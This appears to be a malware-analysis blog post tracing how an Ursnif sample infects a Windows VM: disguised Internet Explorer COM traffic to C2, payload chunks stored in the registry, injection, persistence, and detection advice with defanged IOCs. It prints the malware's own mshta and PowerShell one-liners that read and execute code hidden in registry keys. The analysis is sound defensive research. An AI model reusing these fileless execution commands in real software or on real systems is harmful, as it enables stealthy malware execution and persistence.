# Ursnif: behavioural analysis of the infection process

[@elioxyz](https://twitter.com/elioxyz)

[Home](https://splashdot.github.io)

## Intro

I succesfully infected a VM and analysed the process with NetworkMonitor, Wireshark, Process Monitor, Process Hacker and manually. My goal is to be able to collect as many details as possible from a compromised machine, and to reverse engineer the infection process.

The infection is very silent but contains a number of operations that make it very interesting: Ursnif does not write itself to disk, but rather distributes itself in "chunks" over the registry: this is why its persistence is called "fileless". The process by which it achives such task, that I am going to detail later, is sophisticated and aims at avoiding detection as much as possible, with a considerable variety of means.

Ursnif uses Internet Explorer COM objects to connect to the C2s, and I will show a characteristic that is quite unique to these types of connections. It also uses `powershell.exe` and `mshta.exe` to execute the contents of the registry keys.

Overall it was very interesting working on this sample because of how many intricacies this malware has, starting from one of its macros I analysed [here](https://splashdot.github.io/ursnif).

I divide the infection into two conceptual stages: the first downloads the malware from the Internet with COM objects and creates the registry keys, while the second executes the registry keys and inject the payload into memory (`loader.dll` -> `client.dll`).

## The sample

The sample was retrieved from [Malware Bazaar](https://bazaar.abuse.ch/sample/af07f9aa2ac4a583413860f67106192848a6cbf183c2e10ab2066ef300e1667e/):

*SHA256*: af07f9aa2ac4a583413860f67106192848a6cbf183c2e10ab2066ef300e1667e<br />
*MD5*: b37dfc2b132c7991b866d8dc92e80bcb<br />
*File type*: DLL<br />
*MIME type*: application/x-dosexec<br />
*VT score*: 34/70 (at the time of writing)<br />

## First stage of the infection: preparation

I execute the sample with `regsvr32`, and I can see that it immediately starts using a lot of CPU. It will remain in that state for a while and then exit.

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/process.PNG)

After a shortwhile, I see many instances of `iexplorer.exe` popping up, which are of course not the original and trustworthy process, but rather a clever way the malware authors have found to avoid detection: they are in fact COM objects implementing InternetExplorer. They are used at the beginning of the infection because they will spawn a process that does not seem suspicious and that is known to have outbound network connections, and also because there is not an entry ofr Internet Explorer in the application section of the task manager, that is, only the processes are there.

From the following screenshot taken from a live NetworkMonitor capture, we can clearly see the rogue `iexplorer.exe` processes (red) communicating with the C2 (green) and requesting the typical Ursnif URI (orange):

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/iexplorer.PNG)

The processes are reponsible for connecting to the C2 and downloading the final payload. Following are all the network requests that are downloading the malware.

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/wireshark.PNG)

There is something quite peculiar, that immediately caught my attention: all the requests are seemingly normal, except for the one for favicon.ico. Can you spot why?

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/favicon.PNG)

It has the same weird header I briefly discussed in my [LNK](https://splashdot.github.io/LNK) article, that is "UA-CPU: AMD64". And, sure enough, this behaviour is connected to the fact that the authors decided to use the InternetExplorer COM object: I was able to reproduce it by navigating to HTTP sites that have an icon. In the following screenshot I create an internetexplorer COM object (on the Powershell window to the right) and navigate to a redacted domain (red), that requests the icon (black) and uses the header (green):

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/header.PNG)

It is relevant to note that the malware will also change another registry key associated with Internet Explorer that will make it the default browser.

So, to sum up the process up to this point I will refer to the following system capture performed with procmon, that shows the initial execution with `regsvr32` via powershell and the creation of the internetexplorer COM objects:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/initial.PNG)

Please, note the last process (`explorer.exe`) that spawns an instance of mshta.exe: ursnif has injected into it and begins what I call the second stage.

## Second stage of the infection: final steps

At this point we are able to delve into the fileless aspects of Gozi/Ursnif. The malware stores its files into a semi-randomly named key in the registry located in `HKCU\Software\AppDataLow\Software\Microsoft`. Here is their creation (only the first stage):

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/regi_creation.png)

And here are their contents:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/registry.PNG)

The ones created in the first stage are actually everything needed for the malware to infect a host, the others are set at a later time. Immediately after writing these keys, the malware will execute the contents of `appvadata`:

*appvdata*:
```code
mshta "about:<hta:application><script>resizeTo(1,1);eval(new ActiveXObject('WScript.Shell').regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\3863EAC4-374D-2AC9-81EC-5BFE45E0BF12\\\Autoprov'));if(!window.flag)close()</script>"
```

Which is an HTML application that contains a JS script which executes the contents of the key `Autoprov` through `eval()`.

*Autoprov*:
```code
Nr1fha=new ActiveXObject('WScript.Shell');Nr1fha.Run('powershell iex ([System.Text.Encoding]::ASCII.GetString(( gp "HKCU:\Software\\AppDataLow\\Software\\Microsoft\\3863EAC4-374D-2AC9-81EC-5BFE45E0BF12").apispSvc))',0,0);
```

`Autoprov` will execute the contents of `apispSvc` through an `ActiveXObject` that calls `PowerShell`. Following are the deobfuscated contents of the key `apispSvc`:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/apispsvc.PNG)

Now, this last powershell script is very interesting, since it will perform process injection with bytes; it is lightly obfuscated and contains:

- a function that decodes base64 (`ktavhvyqrgv`) 
- two base64 encoded strings that are being executed with `iex`
- a long array of bytes (`btweqyqexdi`, which is the `loader.dll` employed by Ursnif).

The first base64 encoded line decodes to this:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/firstb64.PNG)

The above code creates two objects (`$klam` and `$tnc`) that allow access to native Windows APIs through Add-Type and allows to call them directly as class members. To unserstand this, here is the second base64 encoded string:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/secondb64.PNG)

This code is responsible for injecting the contents of the bytes array `$btweqyqexdi` into the process running, leveraging `QueueUserAPC`. Windows APIs are called by referencing the objects created before: as en example, `VirtualAllocEx` will be invoked simply by calling `$klaam::VirtualAllocEx`.

Now that `loader.dll` is into memory, it will decode the .bss section where it stores all the strings: this ultimates the infection process as the next step is the final DLL (either Client32 or client64 depending on the system architecture).

## Persistence

Persistence is achieved through a value in `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/persistence.PNG)

The two files ('appvdata.lnk' and 'Autoprov.ps1') are respectively a link to `powershell.exe` and:

```code
iex ([System.Text.Encoding]::ASCII.GetString(( gp "HKCU:\Software\AppDataLow\Software\Microsoft\3863EAC4-374D-2AC9-81EC-5BFE45E0BF12").apispSvc))
```

The key `apispSvc` is the code that does bytes-injection with `loader.dll`, mentioned in the previous paragraph.

Here are the two files in the folder:

![alt text](https://raw.githubusercontent.com/splashdot/splashdot.github.io/master/ursnif2/images/files.PNG)

## Considerations

The detection of this malware could be done with IOCs (such as domains or IPs), but the registry keys prove to be a better way to detect it with precision. Detection could be achieved by analysing the keys in \Run (which are used by many other malware variants), which would eventually point to the key in `HKCU\Software\AppDataLow\Software\Microsoft`, where all the malware resides.

Detection can also be achieved by continuous monitoring: a good indicator are the correlations between network connections and processes (sysmon event 3), given that the exfiltration would start from `explorer.exe` where the malware injects itself into. Ursnif also uses a tor module (please refer to the picture of the registry keys and look for `TorClient`), so Tor traffic could also be used to detect potential malicious activity.

## IOCs

*DLL*<br />
SHA256: af07f9aa2ac4a583413860f67106192848a6cbf183c2e10ab2066ef300e1667e<br />
MD5: b37dfc2b132c7991b866d8dc92e80bcb<br />

*C2*<br />
api3[.]lepini[.]at<br />
c56[.]lepini[.]at<br />
api10[.]laptok[.]at<br />
47[.]241[.]19[.]44<br />